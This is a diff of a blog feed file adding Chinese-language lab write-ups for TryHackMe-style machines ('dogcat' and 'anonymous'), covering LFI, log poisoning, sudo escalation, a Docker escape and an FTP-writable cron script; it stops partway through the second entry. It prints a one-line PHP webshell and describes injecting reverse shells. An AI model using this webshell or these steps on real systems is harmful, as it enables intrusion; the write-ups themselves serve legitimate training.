@@ -4,11 +4,36 @@
   
     
     <entry>
+      <title>dogcat</title>
+      <link href="/2024/11/20/dogcat/"/>
+      <url>/2024/11/20/dogcat/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>从本地文件包含到getshell</p></blockquote><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p><strong>难度</strong>：中<br><strong>描述</strong>：我创建了一个网站，您可以在其中查看狗和&#x2F;或猫的照片！通过 LFI 利用 PHP 应用程序并突破 Docker 容器。 </p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.200.120</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>端口扫描<br> 22,80 </li><li>路径探测<br> <a href="/../assets/img/Pasted%20image%2020241120235951.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120235951.png"></a></li><li>服务枚举<br> 无</li></ol><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h3><p>80端口web服务为攻击点<br>猜测</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$dir = $_GET[&quot;view&quot;] .&#x27;.php&#x27;;</span><br><span class="line">include($dir);</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241121002029.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121002029.png"></a><br><a href="/../assets/img/Pasted%20image%2020241121002212.png" title="payload" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121002212.png" alt="payload"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">containsStr</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$substr</span></span>) </span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="variable">$substr</span>) !== <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$ext</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ext&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;ext&quot;</span>] : <span class="string">&#x27;.php&#x27;</span>; <span class="comment">//不传递ext 默认为php文件 读取passwd 需要传递 ext</span></span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])) &#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="title function_ invoke__">containsStr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&#x27;dog&#x27;</span>) || <span class="title function_ invoke__">containsStr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&#x27;cat&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&#x27;Here you go!&#x27;</span>;</span><br><span class="line">                   <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>] . <span class="variable">$ext</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&#x27;Sorry, only dogs or cats are allowed.&#x27;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241121000130.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121000130.png"></a><br>    <a href="/../assets/img/Pasted%20image%2020241121001227.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121001227.png"></a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>user-agent 利用</p><p><a href="/../assets/img/Pasted%20image%2020241121004940.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121004940.png"></a></p><h3 id="nday利用"><a href="#nday利用" class="headerlink" title="nday利用"></a>nday利用</h3><h3 id="信息审计"><a href="#信息审计" class="headerlink" title="信息审计"></a>信息审计</h3><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>反弹webshell<br><a href="/../assets/img/Pasted%20image%2020241121005119.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121005119.png"></a><br><a href="/../assets/img/Pasted%20image%2020241121005140.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121005140.png"></a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://gtfobins.github.io/gtfobins/env/#shell">https://gtfobins.github.io/gtfobins/env/#shell</a><br><a href="/../assets/img/Pasted%20image%2020241121005701.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121005701.png"></a><br>值得注意的是这是个docker 环境</p><p><a href="/../assets/img/Pasted%20image%2020241121010042.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121010042.png"></a><br><a href="/../assets/img/Pasted%20image%2020241121010217.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121010217.png"></a></p><p>宿主主机会这些这个bashup.sh 可以尝试把revbash 加到sh文件</p><p><a href="/../assets/img/Pasted%20image%2020241121010737.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121010737.png"></a></p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><p>思路总结下：</p><p>利用点：<br>本地文件包含 <code>LFI</code><br>目录确定 后读取index文件，进行代码审计非php文件需要读取传参ext<br>读取apache2 &#x2F;nginx 的访问文件，然后修改useragent 头注入一句话木马,然后反弹shell<br>容器内提权 sudo env<br>docker 逃逸 sh脚本反弹shell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+            <tag> THM </tag>
+            
+            <tag> LFI </tag>
+            
+            <tag> Docker逃逸 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>anonymous</title>
       <link href="/2024/11/20/anonymous/"/>
       <url>/2024/11/20/anonymous/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：middle<br>描述：<br>尝试获取两个标志！扎根机器并证明您对基础知识的理解！这是一个面向初学者的虚拟机。获取这两个标志需要一些 Linux 和权限提升方法的基本知识。</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.226.88</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~]</span><br><span class="line">└─$ naabu -host 10.10.226.88</span><br><span class="line"></span><br><span class="line">                  __</span><br><span class="line">  ___  ___  ___ _/ /  __ __</span><br><span class="line"> / _ \/ _ \/ _ \/ _ \/ // /</span><br><span class="line">/_//_/\_,_/\_,_/_.__/\_,_/</span><br><span class="line"></span><br><span class="line">                projectdiscovery.io</span><br><span class="line"></span><br><span class="line">[INF] Current naabu version 2.3.1 (outdated)</span><br><span class="line">[INF] Running CONNECT scan with non root privileges</span><br><span class="line">10.10.226.88:445</span><br><span class="line">10.10.226.88:21</span><br><span class="line">10.10.226.88:139</span><br><span class="line">10.10.226.88:22</span><br><span class="line">[INF] Found 4 ports on host 10.10.226.88 (10.10.226.88)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>指纹扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCV -p 21,22,139,445 10.10.226.88 --min-rate 10000</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.17.5.121</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2024-11-20T14:30:58+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-11-20T14:30:58</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds</span><br></pre></td></tr></table></figure><h3 id="扫描总结："><a href="#扫描总结：" class="headerlink" title="扫描总结："></a>扫描总结：</h3><ol><li><strong>目标主机</strong>：<ul><li>IP 地址：<code>10.10.226.88</code></li><li>主机状态：在线，延迟 0.27s</li><li>操作系统：Linux，使用 Samba 服务模拟 Windows 信息（版本 Samba 4.7.6）</li></ul></li></ol><hr><ol start="2"><li><strong>端口信息</strong>：<ul><li><p>**21&#x2F;tcp (FTP)**：</p><ul><li>服务：vsftpd 3.0.3</li><li>特性：<ul><li>支持匿名登录（Anonymous FTP）</li><li>存在一个可写目录：<code>/scripts</code></li><li>没有会话带宽限制</li></ul></li><li>安全性：匿名登录与可写目录可能存在敏感信息或恶意文件上传的风险。</li></ul></li><li><p>**22&#x2F;tcp (SSH)**：</p><ul><li>服务：OpenSSH 7.6p1 (Ubuntu)</li><li>支持协议：SSH 2.0</li><li>Hostkey 类型：RSA、ECDSA、ED25519</li><li>安全性：未显示明显漏洞，但可尝试弱口令或暴力破解测试。</li></ul></li><li><p>**139&#x2F;tcp 和 445&#x2F;tcp (SMB)**：</p><ul><li>服务：Samba 文件共享服务</li><li>版本：Samba 4.7.6-Ubuntu</li><li>特性：<ul><li>NetBIOS 名称：<code>ANONYMOUS</code></li><li>工作组：<code>WORKGROUP</code></li><li>认证模式：用户级别认证，但消息签名被禁用（不安全）</li><li>系统时间：<code>2024-11-20T14:30:58</code></li></ul></li></ul></li></ul></li></ol><hr><ol start="3"><li><strong>潜在风险</strong>：<ul><li>FTP 匿名登录和可写目录可能被用于上传恶意文件。</li><li>SMB 消息签名被禁用，可能受到中间人攻击。</li><li>可以进一步枚举 SMB 服务，查看是否存在敏感共享目录。</li><li>端口 22 可以尝试基于暴力破解或默认凭据的测试。</li></ul></li></ol><hr><p><strong>下一步建议</strong>：</p><ol><li><p><strong>针对 FTP</strong>：</p><ul><li>登录匿名 FTP，检查可用文件或上传测试文件验证是否支持写入。</li><li>检查 <code>/scripts</code> 目录下是否存在敏感文件。</li></ul></li><li><p><strong>针对 SMB</strong>：</p><ul><li>使用 <code>smbclient</code> 或其他工具进一步枚举共享资源。</li><li>确认是否有未授权访问的目录或敏感数据。</li></ul></li><li><p><strong>针对 SSH</strong>：</p><ul><li>尝试弱口令暴力破解或利用已知漏洞进行测试。</li></ul></li><li><p><strong>综合测试</strong>：</p><ul><li>针对 SMB 和 FTP 的未授权访问，重点检查是否泄露敏感信息或配置文件。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~]</span><br><span class="line">└─$ cat clean.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>思路：<br>上传恶意的clean.sh 替换这个 导致反弹shell</p><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><p><a href="/../assets/img/Pasted%20image%2020241120230510.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120230510.png"></a></p><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h3 id="使用-find-查找所有系统-SUID-程序"><a href="#使用-find-查找所有系统-SUID-程序" class="headerlink" title="使用 find 查找所有系统 SUID 程序"></a>使用 <code>find</code> 查找所有系统 SUID 程序</h3><p>可以更精确地查看系统中常见的目录中具有 SUID 权限的程序，例如：</p><p><code>find /bin /sbin /usr/bin /usr/sbin -type f -perm -4000 2&gt;/dev/null</code></p><p>这些目录通常包含系统的可执行文件，通过此命令你可以检查这些目录中是否存在具有 SUID 权限的文件。</p><h3 id="使用-which-或-whereis-确定程序的位置"><a href="#使用-which-或-whereis-确定程序的位置" class="headerlink" title="使用 which 或 whereis 确定程序的位置"></a>使用 <code>which</code> 或 <code>whereis</code> 确定程序的位置</h3><p>如果你怀疑某个程序具有 SUID 权限，可以使用 <code>which</code> 或 <code>whereis</code> 命令来查找该程序的路径，然后使用 <code>ls -l</code> 查看其权限：</p><p><code>which &lt;program_name&gt;</code></p><p><code>which passwd</code></p><p>然后查看 <code>passwd</code> 程序的权限：</p><p><code>ls -l $(which passwd)</code></p><h3 id="示例输出"><a href="#示例输出" class="headerlink" title="示例输出"></a>示例输出</h3><p>如果一个文件具有 SUID 权限，你将看到类似以下的输出：</p><p><code>-rwsr-xr-x 1 root root 12345 Apr 1 2024 /usr/bin/passwd</code></p><p>在这个例子中，<code>/usr/bin/passwd</code> 是一个 SUID 程序，意味着即使普通用户执行它，它也会以 root 权限运行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过使用 <code>find</code> 命令查找具有 SUID 权限的程序，或者直接查看文件的权限，你可以识别出可能带来安全风险的程序。确保定期检查系统中具有 SUID 权限的程序，并限制它们的使用权限，尤其是对于不再需要的 SUID 程序。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：middle<br>描述：<br>尝试获取两个标志！扎根机器并证明您对基础知识的理解！这是一个面向初学者的虚拟机。获取这两个标志需要一些 Linux 和权限提升方法的基本知识。</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.226.88</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~]</span><br><span class="line">└─$ naabu -host 10.10.226.88</span><br><span class="line"></span><br><span class="line">                  __</span><br><span class="line">  ___  ___  ___ _/ /  __ __</span><br><span class="line"> / _ \/ _ \/ _ \/ _ \/ // /</span><br><span class="line">/_//_/\_,_/\_,_/_.__/\_,_/</span><br><span class="line"></span><br><span class="line">                projectdiscovery.io</span><br><span class="line"></span><br><span class="line">[INF] Current naabu version 2.3.1 (outdated)</span><br><span class="line">[INF] Running CONNECT scan with non root privileges</span><br><span class="line">10.10.226.88:445</span><br><span class="line">10.10.226.88:21</span><br><span class="line">10.10.226.88:139</span><br><span class="line">10.10.226.88:22</span><br><span class="line">[INF] Found 4 ports on host 10.10.226.88 (10.10.226.88)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>指纹扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCV -p 21,22,139,445 10.10.226.88 --min-rate 10000</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.17.5.121</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2024-11-20T14:30:58+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-11-20T14:30:58</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds</span><br></pre></td></tr></table></figure><h3 id="扫描总结："><a href="#扫描总结：" class="headerlink" title="扫描总结："></a>扫描总结：</h3><ol><li><strong>目标主机</strong>：<ul><li>IP 地址：<code>10.10.226.88</code></li><li>主机状态：在线，延迟 0.27s</li><li>操作系统：Linux，使用 Samba 服务模拟 Windows 信息（版本 Samba 4.7.6）</li></ul></li></ol><hr><ol start="2"><li><strong>端口信息</strong>：<ul><li><p>**21&#x2F;tcp (FTP)**：</p><ul><li>服务：vsftpd 3.0.3</li><li>特性：<ul><li>支持匿名登录（Anonymous FTP）</li><li>存在一个可写目录：<code>/scripts</code></li><li>没有会话带宽限制</li></ul></li><li>安全性：匿名登录与可写目录可能存在敏感信息或恶意文件上传的风险。</li></ul></li><li><p>**22&#x2F;tcp (SSH)**：</p><ul><li>服务：OpenSSH 7.6p1 (Ubuntu)</li><li>支持协议：SSH 2.0</li><li>Hostkey 类型：RSA、ECDSA、ED25519</li><li>安全性：未显示明显漏洞，但可尝试弱口令或暴力破解测试。</li></ul></li><li><p>**139&#x2F;tcp 和 445&#x2F;tcp (SMB)**：</p><ul><li>服务：Samba 文件共享服务</li><li>版本：Samba 4.7.6-Ubuntu</li><li>特性：<ul><li>NetBIOS 名称：<code>ANONYMOUS</code></li><li>工作组：<code>WORKGROUP</code></li><li>认证模式：用户级别认证，但消息签名被禁用（不安全）</li><li>系统时间：<code>2024-11-20T14:30:58</code></li></ul></li></ul></li></ul></li></ol><hr><ol start="3"><li><strong>潜在风险</strong>：<ul><li>FTP 匿名登录和可写目录可能被用于上传恶意文件。</li><li>SMB 消息签名被禁用，可能受到中间人攻击。</li><li>可以进一步枚举 SMB 服务，查看是否存在敏感共享目录。</li><li>端口 22 可以尝试基于暴力破解或默认凭据的测试。</li></ul></li></ol><hr><p><strong>下一步建议</strong>：</p><ol><li><p><strong>针对 FTP</strong>：</p><ul><li>登录匿名 FTP，检查可用文件或上传测试文件验证是否支持写入。</li><li>检查 <code>/scripts</code> 目录下是否存在敏感文件。</li></ul></li><li><p><strong>针对 SMB</strong>：</p><ul><li>使用 <code>smbclient</code> 或其他工具进一步枚举共享资源。</li><li>确认是否有未授权访问的目录或敏感数据。</li></ul></li><li><p><strong>针对 SSH</strong>：</p><ul><li>尝试弱口令暴力破解或利用已知漏洞进行测试。</li></ul></li><li><p><strong>综合测试</strong>：</p><ul><li>针对 SMB 和 FTP 